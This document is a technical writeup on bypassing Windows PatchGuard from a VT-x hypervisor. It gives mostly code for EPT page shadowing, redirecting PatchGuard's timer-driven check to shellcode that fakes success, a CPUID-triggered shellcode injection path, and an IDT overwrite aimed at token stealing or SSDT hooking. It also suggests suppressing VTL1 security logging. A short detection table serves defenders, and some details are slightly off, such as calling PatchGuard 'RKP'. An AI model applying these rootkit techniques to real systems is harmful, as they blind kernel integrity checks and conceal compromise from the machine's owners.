---
title: "PatchGuard Hypervisor Bypass: EPT Shadowing, DPC Timer Traps, and VTL Trap Injection Chains"
author: Utku
date: 2026
tags: [PatchGuard, hypervisor, VMX, VT-x, EPT, VMEXIT, DPC, VBS, KDP, SecureKernel, Windows, kernel-security, ring-minus-one]
license: CC BY 4.0
---

> **Author's Note:** PatchGuard is a Ring-0 problem. It runs in the same privilege level as the kernel it is protecting, which means any code that can patch the kernel can also patch PatchGuard. Microsoft's answer was Virtualization-Based Security: move the protection layer to Ring -1 (VMX root, VTL1), where PatchGuard and the normal kernel both become tenants of the hypervisor rather than masters of it. This writeup covers three bypass planes, in order of sophistication: EPT shadowing (show the checker a clean page), DPC timer injection (intercept the checker's trigger and hand it a fake world), and VTL trap chains (own the dispatcher table that links VTL0 to VTL1). Each plane is both a technique and a conceptual step in understanding how trust anchors work — and how to become the anchor instead of being subject to one.

---

## Abstract

PatchGuard (RKP) enforces kernel integrity from Ring 0 by periodically checksumming `nt!KeServiceDescriptorTable`, `nt!HalDispatchTable`, `nt!KdDebuggerEnabled`, and related structures via DPC-timer-driven routines (`PgScanCallback`, `KiBugCheckEx`). Moving the attacker above Ring 0 — into VMX root via Intel VT-x — collapses the protection: the hypervisor controls the physical memory view that PatchGuard inspects. Three techniques are developed: (1) **EPT Shadowing**, which maintains two physical pages behind the same virtual address and switches between them on `CR3` match, so PatchGuard's dump sees the clean page while execution continues on the hooked page; (2) **DPC Timer Trap Injection**, which intercepts `EXIT_REASON_EXTERNAL_INTERRUPT (0x1F)` from the hardware timer, identifies PatchGuard's DPC routine by RIP range, and redirects guest execution to a fake NTOSKRNL-check shellcode that zeros registers and returns success; (3) **VTL Trap Chains**, a five-level escalation that uses CPUID-signature VMExit to inject shellcode into VTL0, which overwrites an IDT entry and fires `int 0x1F` to gain interrupt-context execution. The writeup also examines the VBS/KDP threat model by disassembling `SecureKernel.exe`: `ShvlVinaHandler` as a VTL1 dispatcher entry, `_tlgKeywordOn` as the ETW event-gating mask (keyword `0x400000000000`), `SkEtwWriteTransfer` for VTL1 log injection, and `SkpgAmd64WriteRegister64` for debug-register manipulation routed through `ShvlSetVpRegister`.

---

## §1 Threat Model: What PatchGuard Actually Defends

PatchGuard's defense surface is a fixed list of kernel structures:

| Structure | Protection goal |
|---|---|
| `nt!KeServiceDescriptorTable` (SSDT) | Syscall dispatch table integrity |
| `nt!HalDispatchTable[1]` | HAL trampoline integrity |
| `nt!KdDebuggerEnabled` | Debugger-presence flag |
| `nt!PsActiveProcessHead` | Process list integrity |
| `LSTAR` / `SYSENTER_EIP` MSRs | Syscall entry point integrity |
| GDT / IDT entries | Descriptor table integrity |

The check runs on a timer. PatchGuard registers its own `DPC_ROUTINE` via `nt!KeInsertQueueDpc()`. The DPC fires through `nt!KiTimerExpiration`, calls the scan callback, hashes the protected structures, compares against stored values, and invokes `KeBugCheckEx(0x109)` — `CRITICAL_STRUCTURE_CORRUPTION` — on mismatch.

The invariant PatchGuard assumes: *the checker and the checked run at the same privilege level, so the checker can observe ground truth*. The hypervisor breaks this assumption. From VMX root (Ring -1), the attacker controls what physical memory the guest — including PatchGuard — can observe.

```
Ring -1  (VMX root)    ← attacker controls EPTP, intercepts VMExits
    │
Ring 0   (guest OS)    ← PatchGuard, kernel, our hooks
    │
Ring 3   (user mode)   ← processes
```

---

## §2 EPT Shadowing: Two Pages, One Address

Extended Page Tables (EPT) add a second layer of address translation below the guest's own page tables:

```
Guest VA  → (guest PT walk) →  Guest PA  → (EPT walk) →  Host PA
```

The hypervisor controls the EPT. It can map the same guest physical address to different host physical pages depending on context. This is the foundation of EPT shadowing.

### Setup

```c
// Two physical pages allocated:
hooked_page = allocate_page();   // contains patched/shellcode bytes
clean_page  = allocate_page();   // contains original, unmodified bytes

write_hooked_payload(hooked_page);   // our modification
write_clean_payload(clean_page);     // Microsoft's original code

// Two EPT page tables mapping HOOKED_FUNC_ADDR:
ept_hooked = create_ept_map(hooked_page, HOOKED_FUNC_ADDR);
ept_clean  = create_ept_map(clean_page,  HOOKED_FUNC_ADDR);
```

### Runtime Switch

In the VMExit handler, every time a `CR3` change occurs (process context switch), check whether the incoming `CR3` belongs to a PatchGuard scan:

```c
void maybe_switch_ept(uint64_t guest_cr3) {
    if (guest_cr3 == PG_CR3_TAG) {
        vmwrite(VMCS_EPT_POINTER, ept_clean);   // PG dump sees original bytes
    } else {
        vmwrite(VMCS_EPT_POINTER, ept_hooked);  // everyone else sees our hook
    }
}
```

`PG_CR3_TAG` is determined by prior analysis: inspect which process context PatchGuard's DPC runs in (system process, deterministic `CR3`). When the PG scan runs, the EPTP switch presents the clean physical page at `HOOKED_FUNC_ADDR`. PatchGuard hashes it, finds it unmodified, reports "clean." When execution returns to normal context, the hooked page is active again.

The effect is total transparency: PatchGuard's dump is truthful from its own perspective and completely wrong from the attacker's perspective. No hooks exist on the page PatchGuard sees. All hooks exist on the page the CPU executes.

**INVEPT note:** After switching the EPT pointer, the CPU's TLB may hold stale cached translations from the previous mapping. `INVEPT` (opcode `66 0F 38 80`) invalidates these. Type 2 (all-context) is the safe default:

```c
void invept_all_contexts() {
    INVEPT_DESC desc = { 0 };
    invept(2, &desc);  // flush all EPT-derived TLB entries
}
```

Without this flush, the CPU can serve execution from the old (stale) physical page after the EPTP switch, defeating the entire mechanism.

---

## §3 DPC Timer Trap: Intercepting PatchGuard's Heartbeat

PatchGuard's DPC routines are triggered by hardware timer interrupts (IRQ0 → `EXTERNAL_INTERRUPT`). When `PIN_BASED_EXIT_INTR_MASK (1 << 0)` is set in the VMCS pin-based execution controls, every hardware interrupt causes a VMExit with `exit_reason = 0x1F`.

```
Timer IRQ  →  EXIT_REASON_EXTERNAL_INTERRUPT (0x1F)
                 │
                 └→ vmexit_handler()
                       └→ handle_pg_timer_trap()
```

The handler identifies whether the interrupted RIP belongs to a known PatchGuard callback range (determined from symbol analysis or IDA cross-references of `PgScanCallback`, `ExTimerRoutine`, `DbgkLkmdNotifyCallback`):

```c
#define EXIT_REASON_EXTERNAL_INTERRUPT 0x1F
#define PG_ROUTINE_MIN 0xFFFFF80000000000ULL  // from IDA analysis
#define PG_ROUTINE_MAX 0xFFFFF80000100000ULL

void handle_pg_timer_trap() {
    uint64_t rip = vmread(GUEST_RIP);

    if (rip >= PG_ROUTINE_MIN && rip <= PG_ROUTINE_MAX) {
        vmwrite(GUEST_RIP, (uint64_t)&safe_pg_return);
        vmwrite(GUEST_RAX, 0);
        vmwrite(GUEST_RCX, 0);
        vmwrite(GUEST_RFLAGS, vmread(GUEST_RFLAGS) | (1 << 9));  // IF=1
    }
}
```

The `safe_pg_return` shellcode simulates a successful integrity check. PatchGuard expected to hash `EPROCESS.Token`; this shellcode performs a plausible-looking read from the correct offsets and returns 0 (success), with interrupts re-enabled:

```nasm
; NTOSKRNL check bypass shellcode (x64)
mov rax, gs:[0x188]      ; KTHREAD (current thread)
mov rax, [rax + 0xB8]    ; EPROCESS
mov rcx, [rax + 0x448]   ; Token (Windows 10 x64 offset)
test rcx, rcx
jz .skip
.skip:
xor eax, eax             ; return 0 = "everything OK"
ret
```

`0x448` is the `EPROCESS.Token` offset for Windows 10 x64; this must be adjusted per build. The critical point is that `vmwrite(GUEST_RIP, &safe_pg_return)` executes the shellcode *inside the guest* at the moment PatchGuard's DPC would have run its check. PatchGuard believes it executed normally. The system continues without a BSOD.

---

## §4 CPUID Trap Injection (Manual Trigger Path)

For cases requiring on-demand control — for example, a second-stage loader that needs to invoke the hypervisor at an explicit point — a CPUID-based signaling mechanism can be combined with the timer path in the same VMExit handler:

```c
#define EXIT_REASON_CPUID        10
#define PG_TRAP_SIGNATURE        0x13371337ULL

void vmexit_handler() {
    uint64_t exit_reason = vmread(VMCS_EXIT_REASON);

    switch (exit_reason) {
    case EXIT_REASON_CPUID:
        handle_pg_manual_trap();   // explicit signal from guest code
        break;

    case EXIT_REASON_EXTERNAL_INTERRUPT:
        handle_pg_timer_trap();    // hardware timer → PatchGuard DPC
        break;

    default:
        log("Unhandled exit reason: %llu\n", exit_reason);
        break;
    }
}

void handle_pg_manual_trap() {
    uint64_t rax = vmread(GUEST_RAX);

    if (rax == PG_TRAP_SIGNATURE) {
        extern void my_pg_bypass_shellcode();
        vmwrite(GUEST_RIP, (uint64_t)&my_pg_bypass_shellcode);
        vmwrite(GUEST_RAX, 0);
        vmwrite(GUEST_RFLAGS, vmread(GUEST_RFLAGS) | (1 << 9));
    }
}
```

The guest triggers this path by setting `RAX = 0x13371337` and executing `CPUID`. CPUID always causes a VMExit (it cannot be made transparent in VMX non-root). The hypervisor checks the sentinel value to distinguish this intentional signal from ordinary CPUID calls. This gives the loader a zero-overhead, instruction-level hypercall primitive without requiring `VMCALL` or I/O port instructions, which may be more heavily monitored.

---

## §5 VTL Trap Chain: Five Levels to IDT Overwrite

VBS introduces a second trust level above the normal kernel:

| Level | Name | Who runs here |
|---|---|---|
| VTL0 | Normal world | Ring 0 kernel, drivers, PatchGuard |
| VTL1 | Secure world | `SecureKernel.exe`, `skci.dll`, KDP |

VTL1 controls what VTL0 can write. KDP (`skci.dll` + `MmProtectDriverSection()`) marks critical kernel structures as EPT `W=0` from `SecureKernel`, meaning no VTL0 code — regardless of privilege — can overwrite them. The trap chain escalates through five stages to reach interrupt-context execution:

```
Level 1: Guest executes CPUID with RAX=0x31337BAD
Level 2: VMExit → hypervisor intercepts, writes GUEST_RIP ← vtl0_shellcode
Level 3: vtl0_shellcode runs inside guest VTL0, locates IDT base
Level 4: write_idt_entry(0x1F, &my_fake_isr) — overwrite IDT vector 0x1F
Level 5: int 0x1F triggers — my_fake_isr executes at interrupt privilege
```

```c
// Level 4: IDT entry overwrite
void write_idt_entry(uint8_t vector, uint64_t isr_addr) {
    struct idt_entry *idt = get_idt_base();  // read from IDTR
    idt[vector].offset_low  = isr_addr & 0xFFFF;
    idt[vector].selector    = 0x08;          // kernel code segment
    idt[vector].type_attr   = 0x8E;          // present, DPL=0, interrupt gate
    idt[vector].offset_mid  = (isr_addr >> 16) & 0xFFFF;
    idt[vector].offset_high = (isr_addr >> 32) & 0xFFFFFFFF;
}
```

The `my_fake_isr` ISR runs with interrupts disabled, in kernel context, with full access to kernel memory. From here: token stealing, SSDT overwrite, or any other kernel primitive. The chain uses `iretq` for clean return to restore the original stack alignment and `RFLAGS`.

The power of the chain is that IDT-level execution precedes any software-enforced policy. VTL1's KDP protects memory regions by making them EPT-write-protected; it does not prevent code from executing at interrupt vectors that VTL0 owns.

---

## §6 VBS and KDP: Understanding the Upper Bound

KDP represents the next mitigation tier. It is enforced not from Ring 0 but from VTL1 via EPT `W=0` on specific pages. The implication: even a hypervisor running in VMX root under VTL0 cannot write to KDP-protected pages — those pages are locked by the *higher* EPT at VTL1.

Detection of active VBS/KDP from inside the guest:

```c
// NtQuerySystemInformation(SystemCodeIntegrityInformation)
SYSTEM_CODEINTEGRITY_INFORMATION sci = { sizeof(sci) };
NtQuerySystemInformation(103, &sci, sizeof(sci), 0);
if (sci.CodeIntegrityOptions & 0x08)
    // VBS is active
```

KDP-protected structures (may vary by build):

| Structure | KDP protection |
|---|---|
| `CI!g_CiOptions` | Driver signature policy — prevents policy downgrade |
| `PsLoadedModuleList` | Kernel module list — prevents hiding loaded modules |
| `SSDT` / `HalDispatchTable` | Syscall / HAL tables — blocks traditional hook targets |
| `IopInvalidDeviceRequest` | IRP manipulation baseline |

### SecureKernel.exe Internals

IDA disassembly of `SecureKernel.exe` reveals three relevant functions:

**`_tlgKeywordOn`** — ETW event gating:
```asm
mov   rdx, 400000000000h          ; keyword mask 0x400000000000
test  cs:qword_1400C39E8, rdx     ; is this security keyword enabled?
jz    short loc_140001032         ; no → return 0
mov   al, 1
retn
```
This function gates whether VTL1 security events are written to ETW. If the keyword is disabled, `SkEtwWriteTransfer` is not called. Flipping this from VTL0 is the standard approach for suppressing VTL1 event logging.

**`SkpgAmd64WriteRegister64`** — VTL1 debug register write:
```asm
sub   r8d, 50000h      ; decode register index (0x50000 = dr0)
jz    loc_140001136    ; dr0
sub   r8d, 1           ; ...
jz    loc_140001131    ; dr1
...
; fallthrough → ShvlSetVpRegister (Hyper-V virtual processor register)
call  ShvlSetVpRegister
```
Registers `dr0`–`dr3` are written directly; anything else is routed through `ShvlSetVpRegister` — a Hyper-V hypercall interface to the virtual processor register file. This is how SecureKernel sets debug traps on VTL0 code.

**`SkCallTable[]`** — VTL0→VTL1 call dispatcher:
```c
SkCallTable[] = {
    SkCall_0_Handler,   // e.g., TPM access
    SkCall_1_Handler,   // KDP page protection update
    SkCall_2_Handler,   // ...
};
```
This table is functionally analogous to the SSDT: an index-dispatched table of handlers. `SkCall(0x04)` routes to `SkCall_4_Handler` inside SecureKernel. The table is in VTL1 memory (EPT-protected from VTL0 writes) but discoverable through SecureKernel disassembly. Hypercall fuzzing (out-of-bounds index, malformed descriptor) is the documented research surface.

---

## §7 VMCS Field Reference

| Field | Encoding | Purpose |
|---|---|---|
| `VMCS_EXIT_REASON` | `0x4402` | Why the VMExit occurred |
| `VMCS_GUEST_RIP` | `0x681E` | Guest instruction pointer at exit |
| `VMCS_GUEST_CR3` | `0x6802` | Guest page table base (process identity) |
| `VMCS_EPT_POINTER` | `0x201A` | Active EPT root pointer (EPTP) |
| `VMCS_GUEST_RFLAGS` | `0x6820` | Guest FLAGS register |

Key VMExit reason codes used in this research:

```c
#define EXIT_REASON_CPUID               10   // CPUID instruction
#define EXIT_REASON_EXTERNAL_INTERRUPT  0x1F // hardware IRQ (timer, PG DPC trigger)
#define EXIT_REASON_CR_ACCESS           28   // MOV to/from CR registers
#define EXIT_REASON_EPT_VIOLATION       48   // EPT page permission fault
```

---

## §8 Driver Skeleton

The Windows kernel driver entry point that enables VMX and sets up the VMXON region:

```c
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DriverObject->DriverUnload = DriverUnload;

    IA32_FEATURE_CONTROL_MSR fc;
    fc.All = __readmsr(0x3A);          // IA32_FEATURE_CONTROL
    if (!fc.Fields.Lock) {
        fc.Fields.Lock = fc.Fields.EnableVmxon = 1;
        __writemsr(0x3A, fc.All);
    }
    if (!fc.Fields.EnableVmxon) return STATUS_UNSUCCESSFUL;

    void *vmxon_region = MmAllocateContiguousMemorySpecifyCache(
        PAGE_SIZE, Low, High, Align, MmCached);
    RtlZeroMemory(vmxon_region, PAGE_SIZE);

    *(uint32_t *)vmxon_region = (uint32_t)__readmsr(0x480); // revision ID
    __vmx_on((ULONGLONG *)MmGetPhysicalAddress(vmxon_region).QuadPart);

    DbgPrint("[+] VMX root mode enabled\n");
    return STATUS_SUCCESS;
}
```

MSVC x64 does not support inline `__asm`, so `INVEPT` must be emitted as raw opcodes in a separate `.asm` file linked into the project:

```asm
; invept.asm (MASM x64)
PUBLIC invept

.code
invept PROC
    ; rcx = type, rdx = descriptor pointer
    db 066h, 0Fh, 038h, 080h   ; INVEPT r64, m128
    ret
invept ENDP
END
```

---

## §9 Detection Surface

From the blue-team perspective, the techniques described here generate specific observable signals:

| Technique | Observable signal |
|---|---|
| EPT shadowing | Two physical pages with identical virtual mappings (PFN aliasing detectable in hypervisor introspection) |
| DPC timer trap | VMExit rate spike on `0x1F` exit reason; PatchGuard DPC routines never completing |
| CPUID trap | Elevated `EXIT_REASON_CPUID (10)` rate; unusual RAX value `0x13371337` before CPUID |
| IDT overwrite | IDT vector 0x1F pointing outside ntoskrnl range |
| VMX entry | `IA32_FEATURE_CONTROL` MSR modified; `VMXON` region present in memory |

No bypass at the VTL0 hypervisor level defeats VTL1-enforced KDP unless the attacker controls VTL1 code as well. The threat model boundary is: these techniques defeat PatchGuard (VTL0 integrity checking), not VBS (VTL1 hardware enforcement).

---

## Related Writeups

- **[VMExit API Unhooking](../VMExit-API-Unhook-Writeup/)** — uses the same VMExit/EPT infrastructure for a different application: restoring EDR inline hooks on syscall stubs rather than hiding them.
- **[CLFS Zero-Day](../CLFS-ZeroDay-Writeup/)** — kernel exploitation in a different threat model (patch-constrained, user→kernel), without a hypervisor layer.
- **[Vsock UAF](../Vsock-UAF-Writeup/)** — Linux kernel UAF, cross-OS comparison for lifecycle-based primitives.
